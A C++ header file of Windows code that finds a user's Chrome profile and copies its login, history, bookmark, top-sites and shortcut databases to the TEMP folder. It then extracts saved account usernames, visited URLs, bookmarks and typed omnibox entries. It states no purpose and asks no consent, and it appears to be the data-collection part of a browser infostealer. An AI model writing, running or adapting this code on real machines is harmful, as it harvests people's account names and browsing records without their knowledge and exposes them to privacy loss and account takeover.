#pragma once

#include <filesystem>
#include <iostream>
#include <cstdlib> 
#include <sqlite3.h>
#include <set>
#include "json.hpp"
#include "helpers.hpp"


using json = nlohmann::json;


bool CheckChrome() {
    char* userProfile = nullptr;
    size_t userProfileSize = 0;
    _dupenv_s(&userProfile, &userProfileSize, "USERPROFILE");

    if (userProfile == nullptr) {
        std::cerr << "Failed to get USERPROFILE environment variable." << std::endl;
        return false;
    }

    // Construct the path to the Chrome data directory
    std::string chromeDataPath = std::string(userProfile) + R"(\AppData\Local\Google\Chrome\User Data\Default)";
    free(userProfile);
    return std::filesystem::exists(chromeDataPath) && std::filesystem::is_directory(chromeDataPath);
}


std::vector<std::string> IsBrowserDataExist() {
    char* userProfile = nullptr;
    size_t userProfileSize = 0;

    // Use _dupenv_s to safely get the USERPROFILE environment variable
    _dupenv_s(&userProfile, &userProfileSize, "USERPROFILE");

    std::vector<std::string> existingFiles;

    if (userProfile == nullptr) {
        std::cerr << "Failed to get USERPROFILE environment variable." << std::endl;
        return existingFiles;
    }

    // Construct the path to the Chrome data directory
    std::string chromeDataPath = std::string(userProfile) + R"(\AppData\Local\Google\Chrome\User Data\Default)";
    free(userProfile);

    std::vector<std::string> fileNames = {
        "Bookmarks",
        "Shortcuts",
        "Login Data For Account",
        "History",
        "Top Sites"
    };

    // Check each file in the list
    for (const auto& fileName : fileNames) {
        std::filesystem::path filePath = chromeDataPath + "\\" + fileName;
        if (std::filesystem::exists(filePath)) {
            existingFiles.push_back(fileName); 
        }
    }

    return existingFiles;
}


void CopyBrowserDataToTemp() {
    if (IsBrowserDataExist().empty()) {
        std::cout << "No browser data files to copy." << std::endl;
        return;
    }

    char* userProfile = nullptr;
    size_t userProfileSize = 0;
    _dupenv_s(&userProfile, &userProfileSize, "USERPROFILE");
    if (userProfile == nullptr) {
        std::cerr << "Failed to get USERPROFILE environment variable." << std::endl;
        return;
    }

    std::string chromeDataPath = std::string(userProfile) + R"(\AppData\Local\Google\Chrome\User Data\Default)";
    free(userProfile);

    // Get the TEMP folder path
    TCHAR tempPathBuffer[MAX_PATH];
    DWORD tempPathLength = GetTempPath(MAX_PATH, tempPathBuffer); 

    if (tempPathLength > MAX_PATH || tempPathLength == 0) {
        std::cerr << "Failed to get TEMP directory path." << std::endl;
        return;
    }

    std::wstring tempPathW(tempPathBuffer);
    std::string tempPath(tempPathW.begin(), tempPathW.end());

    std::vector<std::string> fileNames = {
        "Bookmarks",
        "Shortcuts",
        "Login Data For Account",
        "History",
        "Top Sites"
    };

    for (const auto& fileName : fileNames) {
        std::filesystem::path srcPath = chromeDataPath + "\\" + fileName;
        if (std::filesystem::exists(srcPath)) {
            std::filesystem::path destPath = tempPath + "\\" + fileName;
            try {
                std::filesystem::copy_file(srcPath, destPath, std::filesystem::copy_options::overwrite_existing);
                std::cout << "Copied: " << srcPath << " to " << destPath << std::endl;
            }
            catch (std::filesystem::filesystem_error& e) {
                std::cerr << "Error copying file: " << e.what() << std::endl;
            }
        }
    }
}


std::set<std::string> ChromeUsernames() {
    sqlite3* db;
    sqlite3_stmt* stmt;
    std::set<std::string> uniqueUsernames;

    TCHAR tempPathBuffer[MAX_PATH];
    GetTempPath(MAX_PATH, tempPathBuffer);

    // Convert TEMP path to std::string and append the filename "Login Data For Account"
    std::string filePath = WStringToString(std::wstring(tempPathBuffer)) + "Login Data For Account";

    // Open the SQLite database
    int rc = sqlite3_open(filePath.c_str(), &db);
    if (rc != SQLITE_OK) {
        std::cerr << "Cannot open database: " << sqlite3_errmsg(db) << std::endl;
        sqlite3_close(db);
        return uniqueUsernames; // Return an empty set if the database cannot be opened
}

    // Prepare the SQL query to select unique, non-empty username_value entries
    std::string sql = "SELECT DISTINCT username_value FROM logins WHERE username_value <> '';";
    rc = sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, nullptr);
    if (rc != SQLITE_OK) {
        std::cerr << "Failed to prepare statement: " << sqlite3_errmsg(db) << std::endl;
        sqlite3_close(db);
        return uniqueUsernames; // Return an empty set if the statement cannot be prepared
    }

    // Execute the query and process the results
    while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
        const unsigned char* username = sqlite3_column_text(stmt, 0);
        if (username) {
            uniqueUsernames.insert(std::string(reinterpret_cast<const char*>(username)));
        }
    }

    // Clean up
    sqlite3_finalize(stmt);
    sqlite3_close(db);

    // Return the set of unique usernames
    return uniqueUsernames;
}



std::set<std::string> ChromeBookmarks() {
    std::set<std::string> uniqueURLs;

    TCHAR tempPathBuffer[MAX_PATH];
    GetTempPath(MAX_PATH, tempPathBuffer);

    // Construct the file path using the TEMP directory path
    std::string filePath = std::string(WStringToString(tempPathBuffer)) + "Bookmarks";

    // Open the JSON file
    std::ifstream file(filePath);
    if (!file.is_open()) {
        std::cerr << "Failed to open file: " << filePath << std::endl;
        return {}; // Return an empty set if the file cannot be opened
    }

    // Parse the JSON file
    json bookmarksJson;
    file >> bookmarksJson;
    file.close();

    // Extract URLs from the JSON structure
    try {
        const auto& children = bookmarksJson["roots"]["bookmark_bar"]["children"];
        for (const auto& child : children) {
            if (child.contains("type") && child["type"] == "url" && child.contains("url")) {
                uniqueURLs.insert(child["url"].get<std::string>());
            }
        }
    }
    catch (json::exception& e) {
        std::cerr << "Error parsing JSON: " << e.what() << std::endl;
        return {}; // Return an empty set if there's an error parsing JSON
    }

    return uniqueURLs;
}


std::set<std::string> ChromeTopSites() {
    std::set<std::string> uniqueURLs;
    sqlite3* db;
    sqlite3_stmt* stmt;

    // Buffer to hold the TEMP directory path
    TCHAR tempPathBuffer[MAX_PATH];
    GetTempPath(MAX_PATH, tempPathBuffer);

    // Convert TEMP path to std::string and append the filename "Top Sites"
    std::string dbPath = std::string(WStringToString(tempPathBuffer)) + "Top Sites";

    // Open the SQLite database
    int rc = sqlite3_open(dbPath.c_str(), &db);
    if (rc != SQLITE_OK) {
        std::cerr << "Cannot open database: " << sqlite3_errmsg(db) << std::endl;
        sqlite3_close(db);
        return uniqueURLs; // Return the empty set if the database cannot be opened
    }

    // Prepare the SQL query to select URLs from the "top_sites" table
    std::string sql = "SELECT url FROM top_sites;";
    rc = sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, nullptr);
    if (rc != SQLITE_OK) {
        std::cerr << "Failed to prepare statement: " << sqlite3_errmsg(db) << std::endl;
        sqlite3_close(db);
        return uniqueURLs;
    }

    // Execute the query and process the results
    while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
        const unsigned char* url = sqlite3_column_text(stmt, 0);
        if (url) {
            uniqueURLs.insert(std::string(reinterpret_cast<const char*>(url)));
        }
    }

    // Clean up
    sqlite3_finalize(stmt);
    sqlite3_close(db);

    return uniqueURLs;
}


std::set<std::string> ChromeShortcuts() {
    sqlite3* db;
    sqlite3_stmt* stmt;
    std::set<std::string> entries;

    // Buffer to hold the TEMP directory path
    TCHAR tempPathBuffer[MAX_PATH];
    GetTempPath(MAX_PATH, tempPathBuffer);

    // Convert the TEMP path to std::string and append the filename "Shortcuts"
    std::string dbPath = std::string(WStringToString(tempPathBuffer)) + "Shortcuts";

    // Open the SQLite database
    int rc = sqlite3_open(dbPath.c_str(), &db);
    if (rc != SQLITE_OK) {
        std::cerr << "Cannot open database: " << sqlite3_errmsg(db) << std::endl;
        sqlite3_close(db);
        return entries; // Return an empty set if the database cannot be opened
    }

    // Prepare the SQL query to select all entries from the "fill_into_edit" column in the "omni_box_shortcuts" table
    std::string sql = "SELECT fill_into_edit FROM omni_box_shortcuts;";
    rc = sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, nullptr);
    if (rc != SQLITE_OK) {
        std::cerr << "Failed to prepare statement: " << sqlite3_errmsg(db) << std::endl;
        sqlite3_close(db);
        return entries; // Return an empty set if the statement cannot be prepared
    }

    // Execute the query and process the results
    while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
        const unsigned char* fillIntoEdit = sqlite3_column_text(stmt, 0);
        if (fillIntoEdit) {
            entries.insert(std::string(reinterpret_cast<const char*>(fillIntoEdit)));
        }
    }

    // Clean up
    sqlite3_finalize(stmt);
    sqlite3_close(db);

    // Return the set of entries
    return entries;
}


std::set<std::string> ChromeHistoryURLs() {
    std::set<std::string> uniqueUrls;
    sqlite3* db;
    sqlite3_stmt* stmt;

    // Buffer to hold the TEMP directory path
    TCHAR tempPathBuffer[MAX_PATH];
    GetTempPath(MAX_PATH, tempPathBuffer);

    // Convert TEMP path to std::string and append the filename "History"
    std::string dbPath = std::string(WStringToString(tempPathBuffer)) + "History";

    // Open the SQLite database
    int rc = sqlite3_open(dbPath.c_str(), &db);
    if (rc != SQLITE_OK) {
        std::cerr << "Cannot open database: " << sqlite3_errmsg(db) << std::endl;
        sqlite3_close(db);
        return uniqueUrls;  // Return an empty set if the database cannot be opened
    }

    // Prepare the SQL query to select all URLs from the "urls" table
    std::string sql = "SELECT url FROM urls;";
    rc = sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, nullptr);
    if (rc != SQLITE_OK) {
        std::cerr << "Failed to prepare statement: " << sqlite3_errmsg(db) << std::endl;
        sqlite3_close(db);
        return uniqueUrls;  // Return an empty set if the statement cannot be prepared
    }

    // Execute the query and process the results
    while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
        const unsigned char* url = sqlite3_column_text(stmt, 0);
        if (url) {
            uniqueUrls.insert(std::string(reinterpret_cast<const char*>(url)));
        }
    }

    // Clean up
    sqlite3_finalize(stmt);
    sqlite3_close(db);

    // Return the set of unique URLs
    return uniqueUrls;
}

